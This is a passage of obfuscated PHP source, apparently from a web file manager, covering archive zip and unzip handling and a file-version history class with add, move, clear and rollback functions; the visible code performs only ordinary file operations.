$ìéè¥õ­[$¿†ˆ´¼‚[32]] . $¿†ˆ´¼‚[10] . $º³ˆù‹¯; } } if ($Ì‚òÙíß->getType() == $¿†ˆ´¼‚[106]) { $Ÿ¬üïô = self::init($€ÈÒäŠÑ); $Œ‚—ó’ = $Ÿ¬üïô->getType() == $¿†ˆ´¼‚[106] ? $€ÈÒäŠÑ : get_path_father($Ì‚òÙíß->path); $Œ‚—ó’ = rtrim($Œ‚—ó’, $¿†ˆ´¼‚[8]) . $¿†ˆ´¼‚[8]; mk_dir($Œ‚—ó’); } else { $Éİæ®ø¯ = TEMP_FILES . $¿†ˆ´¼‚[1187] . time() . rand_string(8) . $¿†ˆ´¼‚[8]; mk_dir($Éİæ®ø¯); file_put_contents($Éİæ®ø¯ . $¿†ˆ´¼‚[1188], $¿†ˆ´¼‚[12]); $Œ‚—ó’ = $Éİæ®ø¯; } $ë¥ìŠ¼ù = IO::info($Œ‚—ó’); if (!$ë¥ìŠ¼ù || !$ë¥ìŠ¼ù[$¿†ˆ´¼‚[202]]) { show_json(LNG($¿†ˆ´¼‚[1189]), !1); } $ÉôÁİ£é = self::zipFileList($åİƒîÃí, $Éİæ®ø¯); foreach ($ÉôÁİ£é as $¨İ¡ØøÂ => $Ïºüïƒà) { $ÉôÁİ£é[$¨İ¡ØøÂ] = self::iconvSystem($Ïºüïƒà); } $Ê‘µúµ = get_filename_auto($Œ‚—ó’ . $ƒüÎ´éŸ, $¿†ˆ´¼‚[12], $¥ÂÖ¼Ôı); KodArchive::create(self::iconvSystem($Ê‘µúµ), $ÉôÁİ£é); if (!IO::exist($Ê‘µúµ)) { if ($Éİæ®ø¯) { del_dir($Éİæ®ø¯); } show_json(LNG($¿†ˆ´¼‚[1190]), !1); } if (!$Éİæ®ø¯) { return $Ê‘µúµ; } $šë¤¹È¯ = self::move($Ê‘µúµ, $€ÈÒäŠÑ, $¥ÂÖ¼Ôı); if ($Éİæ®ø¯) { del_dir($Éİæ®ø¯); } if (!$Ê‘µúµ) { show_json(LNG($¿†ˆ´¼‚[1190]), !1); } return $šë¤¹È¯; } public static function unzip($Á¢â¯’÷, $œ†úäÄ×, $‚‡ÒÁ–Ñ = "\55\x31", $¥ÙÍİŞ = "\162\x65\x70\x6c\141\x63\145") { $ºÈ²İí =& $_SERVER[Ü©»’·]; $´€ËÈª‘ = parent::info($Á¢â¯’÷); if (!$´€ËÈª‘) { show_json(LNG($ºÈ²İí[1191]), !1); } $Óµãê‰Ã = IO::infoFull($œ†úäÄ×); if (!$Óµãê‰Ã) { $œ†úäÄ× = IO::mkdir($œ†úäÄ×); } if (isset($Óµãê‰Ã[$ºÈ²İí[411]]) && trim($Óµãê‰Ã[$ºÈ²İí[84]], $ºÈ²İí[8]) != trim($œ†úäÄ×, $ºÈ²İí[8])) { $£˜€‚´¡ = KodIO::make($Óµãê‰Ã[$ºÈ²İí[441]]); $Î¦åğ¯‡ = IO::fileNameAuto($£˜€‚´¡, $Óµãê‰Ã[$ºÈ²İí[32]], REPEAT_RENAME_FOLDER, !0); $œ†úäÄ× = IO::mkdir($£˜€‚´¡ . $Î¦åğ¯‡); } $‚‡ÒÁ–Ñ = $‚‡ÒÁ–Ñ && $‚‡ÒÁ–Ñ != $ºÈ²İí[1192] ? @json_decode($‚‡ÒÁ–Ñ, !0) : -1; $àúÄÙ¹Ë = self::unzipPart($Á¢â¯’÷, $‚‡ÒÁ–Ñ); if (!$àúÄÙ¹Ë || !IO::exist($àúÄÙ¹Ë[$ºÈ²İí[199]])) { show_json(LNG($ºÈ²İí[105]), !1); } $–ªÇ‚ÑÉ = $àúÄÙ¹Ë[$ºÈ²İí[1193]][count($àúÄÙ¹Ë[$ºÈ²İí[1193]]) - 1]; if ($–ªÇ‚ÑÉ[$ºÈ²İí[1194]] == -1 || substr($–ªÇ‚ÑÉ[$ºÈ²İí[32]], -1, 1) == $ºÈ²İí[8]) { $ªåúÁßØ = $àúÄÙ¹Ë[$ºÈ²İí[1195]] . rand_string(10) . $ºÈ²İí[8]; mk_dir($ªåúÁßØ); $”’îÀÀÍ = count($àúÄÙ¹Ë[$ºÈ²İí[1193]]) == 1 ? IO::ext($Á¢â¯’÷) : get_path_ext($àúÄÙ¹Ë[$ºÈ²İí[199]]); $ê±ì¶ì = KodArchive::extract(self::iconvSystem($àúÄÙ¹Ë[$ºÈ²İí[199]]), $ªåúÁßØ, $–ªÇ‚ÑÉ[$ºÈ²İí[1194]], $Î¦åğ¯‡, $”’îÀÀÍ); self::unzipErrorCheck($ê±ì¶ì, array($ºÈ²İí[1196], $Á¢â¯’÷, $”’îÀÀÍ, $œ†úäÄ×, $àúÄÙ¹Ë)); Hook::trigger($ºÈ²İí[1197], $ªåúÁßØ); recursion_dir($ªåúÁßØ, $çìıœàú, $ºÂûè¨½, 0); $Áè“æÓŞ = array_merge($çìıœàú, $ºÂûè¨½); $§¨Ú¡êì = array(); foreach ($Áè“æÓŞ as $½ÀÏ‘) { $æ‰èİšĞ = IO::move(self::iconvApp($½ÀÏ‘), $œ†úäÄ×, $¥ÙÍİŞ); if ($æ‰èİšĞ) { $§¨Ú¡êì[] = $æ‰èİšĞ; } } del_dir($ªåúÁßØ); } else { $æ‰èİšĞ = IO::move($àúÄÙ¹Ë[$ºÈ²İí[199]], $œ†úäÄ×, $¥ÙÍİŞ, get_path_this($–ªÇ‚ÑÉ[$ºÈ²İí[32]])); if ($æ‰èİšĞ) { $§¨Ú¡êì[] = $æ‰èİšĞ; } } return $§¨Ú¡êì ? $§¨Ú¡êì : !1; } public static function unzipList($ªÓòœË¶) { $äİ½òñ• =& $_SERVER[Ü©»’·]; $çÓßÄõ = isset($ªÓòœË¶[$äİ½òñ•[1198]]) ? $ªÓòœË¶[$äİ½òñ•[1198]] : !1; $Ã¿ñÀµ = isset($ªÓòœË¶[$äİ½òñ•[1194]]) ? @json_decode($ªÓòœË¶[$äİ½òñ•[1194]], !0) : -1; $æøçŠ™ = self::unzipPart($ªÓòœË¶[$äİ½òñ•[84]], $Ã¿ñÀµ); if (!$æøçŠ™ || !IO::exist($æøçŠ™[$äİ½òñ•[199]])) { show_json(LNG($äİ½òñ•[105]), !1); } $Ğœ‰†—Ö = $æøçŠ™[$äİ½òñ•[1193]][count($æøçŠ™[$äİ½òñ•[1193]]) - 1]; $ÃœšÆÈœ = in_array(IO::ext($æøçŠ™[$äİ½òñ•[199]]), array($äİ½òñ•[313], $äİ½òñ•[1199], $äİ½òñ•[1200], $äİ½òñ•[1201], $äİ½òñ•[1202], $äİ½òñ•[1203])); if (!$çÓßÄõ && ($Ğœ‰†—Ö[$äİ½òñ•[1194]] == -1 || $ÃœšÆÈœ)) { $íÇˆüÀË = $æøçŠ™[$äİ½òñ•[1195]] . get_path_this($æøçŠ™[$äİ½òñ•[199]]) . $äİ½òñ•[1204]; if (!IO::exist($íÇˆüÀË)) { $ç­Ø†ğß = $Ğœ‰†—Ö[$äİ½òñ•[1194]] == -1 ? get_path_ext(IO::pathThis($ªÓòœË¶[$äİ½òñ•[84]])) : get_path_ext($æøçŠ™[$äİ½òñ•[199]]); $·Š©íô£ = KodArchive::listContent(self::iconvSystem($æøçŠ™[$äİ½òñ•[199]]), !0, $ç­Ø†ğß); self::unzipErrorCheck($·Š©íô£, array($äİ½òñ•[1205], $ªÓòœË¶, $æøçŠ™)); @file_put_contents($íÇˆüÀË, json_encode($·Š©íô£[$äİ½òñ•[1206]])); } return @json_decode(IO::getContent($íÇˆüÀË), !0); } IO::fileOut($æøçŠ™[$äİ½òñ•[199]], $çÓßÄõ, get_path_this($Ğœ‰†—Ö[$äİ½òñ•[32]])); die; } private static function zipFileList($Í³¼æ»ñ, $¼›¹¼Ó£ = false) { $àš›ŒÊ„ =& $_SERVER[Ü©»’·]; $ú©ÜİÏâ = array(); foreach ($Í³¼æ»ñ as $¨®Õ”†¸) { $ù‹Ï‡š = $¨®Õ”†¸[$àš›ŒÊ„[84]]; if ($¼›¹¼Ó£) { $ù‹Ï‡š = self::copy($¨®Õ”†¸[$àš›ŒÊ„[84]], $¼›¹¼Ó£, $àš›ŒÊ„[824]); } else { $ö’èÄö¹ = self::init($¨®Õ”†¸[$àš›ŒÊ„[84]]); if ($ö’èÄö¹->getType() == $àš›ŒÊ„[106]) { $ù‹Ï‡š = $ö’èÄö¹->path; } } if ($ù‹Ï‡š && self::local()->exist($ù‹Ï‡š)) { $ú©ÜİÏâ[$¨®Õ”†¸[$àš›ŒÊ„[84]]] = $ù‹Ï‡š; } } if (!empty($ú©ÜİÏâ)) { return array_values($ú©ÜİÏâ); } show_json(LNG($àš›ŒÊ„[1169]), !1); } private static function localFilePath($à’Êñ™ó) { $‘±À¾ =& $_SERVER[Ü©»’·]; $Ü–óÊ‡ = KodIO::parse($à’Êñ™ó); if ($Ü–óÊ‡[$‘±À¾[33]] == KodIO::KOD_SOURCE) { $­¦ ûö = Model($‘±À¾[831])->fileInfoGet(KodIO::sourceID($à’Êñ™ó)); if (!$­¦ ûö[$‘±À¾[84]]) { show_json($‘±À¾[1207], !1); } $à’Êñ™ó = $­¦ ûö[$‘±À¾[84]]; } $Š©Åëİ… = self::init($à’Êñ™ó); if ($Š©Åëİ…->pathParse[$‘±À¾[1154]]) { $à’Êñ™ó = $Š©Åëİ…->pathParse[$‘±À¾[1154]]; $Š©Åëİ… = self::init($à’Êñ™ó); } $±×½Ÿëµ = $Š©Åëİ…->getType(); if ($±×½Ÿëµ == $‘±À¾[106] || $±×½Ÿëµ == $‘±À¾[1208]) { if (!$Š©Åëİ…->exist($Š©Åëİ…->path)) { show_json(LNG($‘±À¾[105]), !1); } return $Š©Åëİ…->path; } return !1; } public static function unzipPart($ÕÁºæ×û, $÷ëÀ¾ = -1) { $¨İ¨¨»± =& $_SERVER[Ü©»’·]; $üÊ„ÉÎÁ = IO::pathThis($ÕÁºæ×û); if (!$÷ëÀ¾ || $÷ëÀ¾ == -1) { $…âÏõØ¸ = array(array($¨İ¨¨»±[32] => $üÊ„ÉÎÁ, $¨İ¨¨»±[1194] => -1)); $…âÏõØ¸[0][$¨İ¨¨»±[1209]] = $…âÏõØ¸[0][$¨İ¨¨»±[32]]; } else { if (is_array($÷ëÀ¾)) { $…âÏõØ¸ = $÷ëÀ¾; $â¸şÂ¨õ = count($…âÏõØ¸) - 1; for ($Ú„ËŒœñ = 0; $Ú„ËŒœñ <= $â¸şÂ¨õ; $Ú„ËŒœñ++) { $ğ–ÊÌ©Í = $…âÏõØ¸[$Ú„ËŒœñ]; $ıÂ¥šË— = get_path_this($ğ–ÊÌ©Í[$¨İ¨¨»±[32]]) . (checkExtSafe($ğ–ÊÌ©Í[$¨İ¨¨»±[32]]) ? $¨İ¨¨»±[12] : $¨İ¨¨»±[1210]); $…âÏõØ¸[$Ú„ËŒœñ][$¨İ¨¨»±[1209]] = $¨İ¨¨»±[1211] . intval($ğ–ÊÌ©Í[$¨İ¨¨»±[1194]]) . $¨İ¨¨»±[395] . $ıÂ¥šË—; if ($Ú„ËŒœñ == 0) { continue; } $…âÏõØ¸[$Ú„ËŒœñ][$¨İ¨¨»±[1209]] = $…âÏõØ¸[$Ú„ËŒœñ - 1][$¨İ¨¨»±[1209]] . $¨İ¨¨»±[1212] . $…âÏõØ¸[$Ú„ËŒœñ][$¨İ¨¨»±[1209]]; } } } if (!is_array($…âÏõØ¸) || count($…âÏõØ¸) == 0) { return !1; } $øÅÚí€¶ = $…âÏõØ¸[count($…âÏõØ¸) - 1]; if (!IO::exist($ÕÁºæ×û)) { return !1; } $™÷Ø­¢ß = TEMP_FILES . $¨İ¨¨»±[1213] . kodIO::hashPathSafe($ÕÁºæ×û) . $¨İ¨¨»±[8]; $µÀ·Ô² = $™÷Ø­¢ß . $øÅÚí€¶[$¨İ¨¨»±[1209]]; mk_dir($™÷Ø­¢ß); file_put_contents(TEMP_FILES . $¨İ¨¨»±[1188], $¨İ¨¨»±[12]); if (IO::exist($µÀ·Ô²)) { return array($¨İ¨¨»±[199] => $µÀ·Ô², $¨İ¨¨»±[1193] => $…âÏõØ¸, $¨İ¨¨»±[1195] => $™÷Ø­¢ß); } $êâúÍû¾ = self::localFilePath($ÕÁºæ×û); if (!$êâúÍû¾) { $êâúÍû¾ = $™÷Ø­¢ß . $¨İ¨¨»±[1214]; if (!IO::exist($êâúÍû¾)) { self::copy($ÕÁºæ×û, $™÷Ø­¢ß, !1, get_path_this($êâúÍû¾)); } } if (!$êâúÍû¾ || !IO::exist($êâúÍû¾)) { return !1; } if ($øÅÚí€¶[$¨İ¨¨»±[1194]] == -1) { return array($¨İ¨¨»±[199] => $êâúÍû¾, $¨İ¨¨»±[1193] => $…âÏõØ¸, $¨İ¨¨»±[1195] => $™÷Ø­¢ß); } $Ş²‚Èš = $êâúÍû¾; foreach ($…âÏõØ¸ as $Ú„ËŒœñ => $ğ–ÊÌ©Í) { if (!$ğ–ÊÌ©Í || $ğ–ÊÌ©Í[$¨İ¨¨»±[1194]] == $¨İ¨¨»±[1192]) { break; } if (substr($ğ–ÊÌ©Í[$¨İ¨¨»±[32]], -1, 1) == $¨İ¨¨»±[8]) { break; } $›Âß¶Ó = in_array(get_path_ext($ğ–ÊÌ©Í[$¨İ¨¨»±[1209]]), array($¨İ¨¨»±[313], $¨İ¨¨»±[1199], $¨İ¨¨»±[1200], $¨İ¨¨»±[1201], $¨İ¨¨»±[1202], $¨İ¨¨»±[1203])); $èÃ˜È¿· = $Ú„ËŒœñ == count($…âÏõØ¸) - 1 && $›Âß¶Ó; $¼ÍâÃ«ü = $™÷Ø­¢ß . $ğ–ÊÌ©Í[$¨İ¨¨»±[1209]]; $šñéÄ¶ = $™÷Ø­¢ß . get_path_this($ğ–ÊÌ©Í[$¨İ¨¨»±[32]]); if (IO::exist($¼ÍâÃ«ü)) { $Ş²‚Èš = $¼ÍâÃ«ü; continue; } $—Ğò¦øÙ = $Ú„ËŒœñ == 0 ? get_path_ext($üÊ„ÉÎÁ) : get_path_ext($Ş²‚Èš); $®íÚ±õº = KodArchive::extract(self::iconvSystem($Ş²‚Èš), $™÷Ø­¢ß, $ğ–ÊÌ©Í[$¨İ¨¨»±[1194]], $ÙËÈÏÜ°, $—Ğò¦øÙ); self::unzipErrorCheck($®íÚ±õº, array($¨İ¨¨»±[1215], $ÕÁºæ×û, $…âÏõØ¸, $ğ–ÊÌ©Í, $¼ÍâÃ«ü)); if (IO::exist($šñéÄ¶)) { IO::rename($šñéÄ¶, get_path_this($¼ÍâÃ«ü)); } $Ş²‚Èš = $¼ÍâÃ«ü; } $µÀ·Ô² = $Ş²‚Èš; return array($¨İ¨¨»±[199] => $Ş²‚Èš, $¨İ¨¨»±[1193] => $…âÏõØ¸, $¨İ¨¨»±[1195] => $™÷Ø­¢ß); } private static function unzipErrorCheck($¼åúŞË, $‘£ßµÈÛ = false) { $âüÉâ¯û =& $_SERVER[Ü©»’·]; if ($¼åúŞË[$âüÉâ¯û[1216]]) { return !0; } write_log(array($âüÉâ¯û[1217], $¼åúŞË, $‘£ßµÈÛ), $âüÉâ¯û[1218]); show_json($âüÉâ¯û[1219] . json_encode($¼åúŞË[$âüÉâ¯û[1206]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¬’àŒ¾İ =& $_SERVER[Ü©»’·]; $”š“Ç—Ã = $GLOBALS[$¬’àŒ¾İ[6]][$¬’àŒ¾İ[89]]; if ($”š“Ç—Ã[$¬’àŒ¾İ[1220]] != 1) { return; } if ($”š“Ç—Ã[$¬’àŒ¾İ[1221]] <= 0) { return; } if (isset($_REQUEST[$¬’àŒ¾İ[1222]]) && $_REQUEST[$¬’àŒ¾İ[1222]] == $¬’àŒ¾İ[88]) { return; } Hook::bind($¬’àŒ¾İ[1223], $¬’àŒ¾İ[1224]); Hook::bind($¬’àŒ¾İ[1225], $¬’àŒ¾İ[1226]); Hook::bind($¬’àŒ¾İ[1227], $¬’àŒ¾İ[1228]); Hook::bind($¬’àŒ¾İ[1229], $¬’àŒ¾İ[1230]); Hook::bind($¬’àŒ¾İ[1231], $¬’àŒ¾İ[1232]); Hook::bind($¬’àŒ¾İ[1233], $¬’àŒ¾İ[1234]); } public static function eventBeforeUpload($‰¤¨ø¬ª) { if ($‰¤¨ø¬ª[3] && $‰¤¨ø¬ª[3] != REPEAT_REPLACE) { return; } $öÇ˜†™ô = self::parsePath($‰¤¨ø¬ª[0]); if (!$öÇ˜†™ô) { return; } self::add($öÇ˜†™ô); } public static function eventBeforeEdit($³•¡áˆí) { $ À÷‡ÎŸ = self::parsePath($³•¡áˆí[0]); if (!$ À÷‡ÎŸ) { return; } self::add($ À÷‡ÎŸ); } public static function eventBeforeCopyFile($şß¾, $ˆ¡ŠÜü§, $­Ãà‹ë“, $ğŒíÛ†, $ìšùªéĞ, $ÜöŠ¨¥) { $±°œãŠ¦ =& $_SERVER[Ü©»’·]; if (isset($­Ãà‹ë“->_data[$±°œãŠ¦[1158]]) && $­Ãà‹ë“->_data[$±°œãŠ¦[1158]]) { return; } $Í²§”¨ú = $­Ãà‹ë“->getPathOuter($ğŒíÛ†); $ªú®Ùõö = self::parsePath($Í²§”¨ú); if (!$ªú®Ùõö) { return; } self::add($ªú®Ùõö); } public static function eventBeforeRename($ï«ÎÄ·ë) { $ëÏ¾¦÷Ö =& $_SERVER[Ü©»’·]; $Šµ¬”Ğ» = self::parsePath($ï«ÎÄ·ë[0]); if (!$Šµ¬”Ğ») { return; } $ÉªÉ¼ = self::checkInHistory($Šµ¬”Ğ»); if (!$ÉªÉ¼) { return; } if ($ÉªÉ¼[$ëÏ¾¦÷Ö[33]] == $ëÏ¾¦÷Ö[199]) { $îÉ½ã° = self::listData($Šµ¬”Ğ»); if ($îÉ½ã° && $îÉ½ã°[$ëÏ¾¦÷Ö[378]]) { self::moveHistory($Šµ¬”Ğ», $ï«ÎÄ·ë[1]); } } else { IO::rename($ÉªÉ¼[$ëÏ¾¦÷Ö[84]], $ï«ÎÄ·ë[1]); } } public static function eventBeforeMove($ØïôÆšî) { $‡±êÕÆ =& $_SERVER[Ü©»’·]; $â—€‘ğú = self::parsePath($ØïôÆšî[0]); if (!$â—€‘ğú) { return; } $¿«çŞ«¯ = self::parsePath($ØïôÆšî[1]); if (!$¿«çŞ«¯) { return; } $²Æ•…ç´ = $ØïôÆšî[3]; $˜´ãêø = self::checkInHistory($â—€‘ğú); if (!$˜´ãêø) { return; } $ÍàÎˆ¤Û = self::pathHistory($¿«çŞ«¯); if ($˜´ãêø[$‡±êÕÆ[33]] == $‡±êÕÆ[199]) { $ÚÌ”ïË¥ = self::listData($â—€‘ğú); $ÇÂ¾Çõ = rtrim($¿«çŞ«¯, $‡±êÕÆ[8]) . $‡±êÕÆ[8] . ($²Æ•…ç´ ? $²Æ•…ç´ : get_path_this($â—€‘ğú)); $¬Æ³Àò = self::listData($ÇÂ¾Çõ); if ($ÚÌ”ïË¥ && $ÚÌ”ïË¥[$‡±êÕÆ[378]] && $¬Æ³Àò && $¬Æ³Àò[$‡±êÕÆ[378]]) { return self::clear($â—€‘ğú); } if ($ÚÌ”ïË¥ && $ÚÌ”ïË¥[$‡±êÕÆ[378]]) { self::moveHistory($â—€‘ğú, $²Æ•…ç´, $ÍàÎˆ¤Û); } } else { IO::move($˜´ãêø[$‡±êÕÆ[84]], $ÍàÎˆ¤Û, !1, $²Æ•…ç´); self::clearEmptyFolder(IO::pathFather($˜´ãêø[$‡±êÕÆ[84]])); } } public static function eventAfterRemove($›Ûà, $òëîçÜè) { $æªı”ğ¢ =& $_SERVER[Ü©»’·]; if (!$òëîçÜè) { return; } $È¡óì… = self::parsePath($›Ûà[0]); if (!$È¡óì…) { return; } $ø¯ˆÜÌõ = self::checkInHistory($È¡óì…); if (!$ø¯ˆÜÌõ) { return; } if ($ø¯ˆÜÌõ[$æªı”ğ¢[33]] == $æªı”ğ¢[199]) { $Öïöïı = self::listData($È¡óì…, !1); if ($Öïöïı && $Öïöïı[$æªı”ğ¢[378]]) { self::clear($È¡óì…, !1); } } else { IO::remove($ø¯ˆÜÌõ[$æªı”ğ¢[84]]); self::clearEmptyFolder(IO::pathFather($ø¯ˆÜÌõ[$æªı”ğ¢[84]])); } } private static function checkInHistory($ÏäÎ˜½µ) { $ÑúÅ³°é = self::pathHistory($ÏäÎ˜½µ); if (!IO::exist($ÑúÅ³°é)) { $ÑúÅ³°é .= $_SERVER[Ü©»’·][1235]; } return IO::exist($ÑúÅ³°é) ? IO::info($ÑúÅ³°é) : !1; } private static function parsePath($ÓÖüù©›) { $¬»¨‚¿ô =& $_SERVER[Ü©»’·]; if (!$ÓÖüù©›) { return !1; } if ($GLOBALS[$¬»¨‚¿ô[1236]]) { return; } $¢ÉĞ‚îì = KodIO::parse($ÓÖüù©›); $­Ø®´„å = $¢ÉĞ‚îì[$¬»¨‚¿ô[33]]; $öÙ¶‘ïé = !$­Ø®´„å || $­Ø®´„å == KodIO::KOD_IO || $­Ø®´„å == KodIO::KOD_SHARE_ITEM; if (!$öÙ¶‘ïé || !$¢ÉĞ‚îì[$¬»¨‚¿ô[1237]]) { return !1; } if (substr($ÓÖüù©›, 0, strlen(DATA_PATH . $¬»¨‚¿ô[1238])) == DATA_PATH . $¬»¨‚¿ô[1238]) { return !1; } if ($­Ø®´„å == KodIO::KOD_SHARE_ITEM) { $ôÍ¥¬±­ = IO::init($ÓÖüù©›); if ($ôÍ¥¬±­->pathParse[$¬»¨‚¿ô[1154]]) { return self::parsePath($ôÍ¥¬±­->pathParse[$¬»¨‚¿ô[1154]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¹åŸÂèÍ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¬»¨‚¿ô[1239]); foreach ($¹åŸÂèÍ as $İüûŠŠ¾) { if (!$­Ø®´„å && substr($ÓÖüù©›, 0, strlen($İüûŠŠ¾)) == $İüûŠŠ¾) { return !1; } } self::log($GLOBALS[$¬»¨‚¿ô[1149]] . $¬»¨‚¿ô[1240] . $ÓÖüù©›); return $ÓÖüù©›; } private static function pathHistory($õ…Æ”ë) { $±íÛÍ¾Ğ =& $_SERVER[Ü©»’·]; $è©ÛÌ à = self::$_historyBase . ltrim(KodIO::clear($õ…Æ”ë), $±íÛÍ¾Ğ[8]); $è©ÛÌ à = str_replace(array($±íÛÍ¾Ğ[1241]), array($±íÛÍ¾Ğ[1242]), $è©ÛÌ à); return $è©ÛÌ à; } public static function log($×²Šèë®) { } public static function historyCount($Üƒ¤°ı†) { $ö¡ Úñ® =& $_SERVER[Ü©»’·]; $½èøÜ²¿ = array(); $î¬—‹Ö = array(); foreach ($Üƒ¤°ı† as $Ì‘Ùº¨) { $„¶ü°ğâ = get_path_father($Ì‘Ùº¨); if (!$î¬—‹Ö[$„¶ü°ğâ]) { $î¬—‹Ö[$„¶ü°ğâ] = array(); } $î¬—‹Ö[$„¶ü°ğâ][] = get_path_this($Ì‘Ùº¨); } foreach ($î¬—‹Ö as $„¶ü°ğâ => $£›Æî) { $Ğ¡äˆ”ç = self::parsePath($„¶ü°ğâ); if (!$Ğ¡äˆ”ç) { continue; } foreach ($£›Æî as $¶òªşË) { $Âö¤¿® = self::listData(rtrim($Ğ¡äˆ”ç, $ö¡ Úñ®[8]) . $ö¡ Úñ®[8] . $¶òªşË, !1); if ($Âö¤¿® && $Âö¤¿®[$ö¡ Úñ®[378]]) { $½èøÜ²¿[rtrim($„¶ü°ğâ, $ö¡ Úñ®[8]) . $ö¡ Úñ®[8] . $¶òªşË] = count($Âö¤¿®[$ö¡ Úñ®[378]]); } } } return $½èøÜ²¿; } public static function add($À¢ì·ÅÓ) { $†ï„Æı± =& $_SERVER[Ü©»’·]; $±€Ù¿ÔĞ = self::listData($À¢ì·ÅÓ); if (!$±€Ù¿ÔĞ) { return; } $¿ƒô‰ø = Model($†ï„Æı±[776])->get($†ï„Æı±[1243]); $ß—Æê«± = $GLOBALS[$†ï„Æı±[6]][$†ï„Æı±[89]][$†ï„Æı±[1221]]; $şéÜ´§È = $¿ƒô‰ø == $†ï„Æı±[1244] ? min(5, $ß—Æê«±) : $ß—Æê«±; if ($ß—Æê«± <= 0) { return; } $°¶ÍÆâ¥ = IO::info($À¢ì·ÅÓ); $Ö¥Ë‹¡ = $±€Ù¿ÔĞ[$†ï„Æı±[378]]; if ($°¶ÍÆâ¥[$†ï„Æı±[76]] == 0) { return; } if ($°¶ÍÆâ¥[$†ï„Æı±[76]] >= 1024 * 1024 * 500) { return !1; } $í¥ÈÒ—‘ = IO::hashSimple($À¢ì·ÅÓ); if ($Ö¥Ë‹¡ && $Ö¥Ë‹¡[0][$†ï„Æı±[177]] == $í¥ÈÒ—‘) { return !0; } if (array_key_exists($†ï„Æı±[202], $°¶ÍÆâ¥) && !$°¶ÍÆâ¥[$†ï„Æı±[202]]) { return !1; } $¶¼¬ô¿Ö = short_id(time()); $Ò‚¬·ˆ¬ = array($†ï„Æı±[408] => $¶¼¬ô¿Ö, $†ï„Æı±[177] => $í¥ÈÒ—‘, $†ï„Æı±[32] => $°¶ÍÆâ¥[$†ï„Æı±[32]] . $†ï„Æı±[10] . date($†ï„Æı±[1245]) . rand_string(1), $†ï„Æı±[76] => $°¶ÍÆâ¥[$†ï„Æı±[76]], $†ï„Æı±[463] => USER_ID, $†ï„Æı±[200] => time(), $†ï„Æı±[1246] => $†ï„Æı±[12]); IO::mkdir($±€Ù¿ÔĞ[$†ï„Æı±[1247]]); $Ë¥×õº¼ = IO::copy($À¢ì·ÅÓ, $±€Ù¿ÔĞ[$†ï„Æı±[1247]], !1, $Ò‚¬·ˆ¬[$†ï„Æı±[32]]); if (!$Ë¥×õº¼) { self::clearEmptyFolder($±€Ù¿ÔĞ[$†ï„Æı±[1247]]); return !1; } array_unshift($Ö¥Ë‹¡, $Ò‚¬·ˆ¬); if (count($Ö¥Ë‹¡) > $şéÜ´§È) { $Ê‡ç“Ì = array_slice($Ö¥Ë‹¡, $şéÜ´§È); foreach ($Ê‡ç“Ì as $¤ú÷ÊüÂ) { IO::remove($±€Ù¿ÔĞ[$†ï„Æı±[1247]] . $¤ú÷ÊüÂ[$†ï„Æı±[32]]); } $Ö¥Ë‹¡ = array_slice($Ö¥Ë‹¡, 0, $şéÜ´§È); } return self::saveData($±€Ù¿ÔĞ[$†ï„Æı±[1248]], $Ö¥Ë‹¡); } public static function remove($€¿Õş±®, $™ò§ë’Ã) { $ÂÈ—›à =& $_SERVER[Ü©»’·]; $ÑĞ—úÙâ = self::listData($€¿Õş±®); $ññ„ŞãÆ = array(); if (!$ÑĞ—úÙâ) { return !1; } foreach ($ÑĞ—úÙâ[$ÂÈ—›à[378]] as $ûáï¡Û¼) { if ($ûáï¡Û¼[$ÂÈ—›à[408]] == $™ò§ë’Ã) { IO::remove($ÑĞ—úÙâ[$ÂÈ—›à[1247]] . $ûáï¡Û¼[$ÂÈ—›à[32]]); continue; } $ññ„ŞãÆ[] = $ûáï¡Û¼; } return self::saveData($ÑĞ—úÙâ[$ÂÈ—›à[1248]], $ññ„ŞãÆ); } public static function clear($ÍÀÕ•·ı, $ÈæÈÂí‚ = true) { $‚§‘§Ñ =& $_SERVER[Ü©»’·]; $êÀã—ï = self::listData($ÍÀÕ•·ı, $ÈæÈÂí‚); if (!$êÀã—ï) { return !1; } foreach ($êÀã—ï[$‚§‘§Ñ[378]] as $€ÕÓ®Ó) { IO::remove($êÀã—ï[$‚§‘§Ñ[1247]] . $€ÕÓ®Ó[$‚§‘§Ñ[32]]); } return self::saveData($êÀã—ï[$‚§‘§Ñ[1248]], array()); } public static function moveHistory($ÍØ’ªÃ›, $Ë¡´æÍ– = '', $¦àâÓö = '') { $×àº¨öä =& $_SERVER[Ü©»’·]; $•©¨„æ = self::listData($ÍØ’ªÃ›, !1); if (!$•©¨„æ || !$•©¨„æ[$×àº¨öä[378]]) { return !1; } $áş³·øß = $×àº¨öä[1235]; $Ë¡´æÍ– = $Ë¡´æÍ– ? $Ë¡´æÍ– : get_path_this($ÍØ’ªÃ›); $¦àâÓö = $¦àâÓö ? $¦àâÓö : $•©¨„æ[$×àº¨öä[1247]]; $ÚÏ ®‰ë = substr(get_path_this($•©¨„æ[$×àº¨öä[1248]]), 0, -strlen($áş³·øß)); foreach ($•©¨„æ[$×àº¨öä[378]] as $€Öò°ôÅ => $ÆüÍËü) { $ôŞ¦èˆ = $Ë¡´æÍ– . substr($ÆüÍËü[$×àº¨öä[32]], strlen($ÚÏ ®‰ë)); $“çµƒ¼­ = IO::move($•©¨„æ[$×àº¨öä[1247]] . $ÆüÍËü[$×àº¨öä[32]], $¦àâÓö, !1, $ôŞ¦èˆ); if ($“çµƒ¼­) { $•©¨„æ[$×àº¨öä[378]][$€Öò°ôÅ][$×àº¨öä[32]] = $ôŞ¦èˆ; } } $•©¨„æ[$×àº¨öä[1248]] = IO::move($•©¨„æ[$×àº¨öä[1248]], $¦àâÓö, !1, $Ë¡´æÍ– . $áş³·øß); self::saveData($•©¨„æ[$×àº¨öä[1248]], $•©¨„æ[$×àº¨öä[378]]); self::clearEmptyFolder($•©¨„æ[$×àº¨öä[1247]]); } public static function rollback($¦—å Òñ, $ää‚«áç) { $ç¢œÀ¨ˆ =& $_SERVER[Ü©»’·]; $½ú±Î = self::listData($¦—å Òñ); if (!$½ú±Î) { return; } $ ıŞ§î— = IO::info($¦—å Òñ); foreach ($½ú±Î[$ç¢œÀ¨ˆ[378]] as $Åš£Å˜Ê => $ÎáçÏö¥) { if ($ÎáçÏö¥[$ç¢œÀ¨ˆ[408]] == $ää‚«áç) { self::add($¦—å Òñ); $‘ñÙÁİ˜ = $½ú±Î[$ç¢œÀ¨ˆ[1247]] . 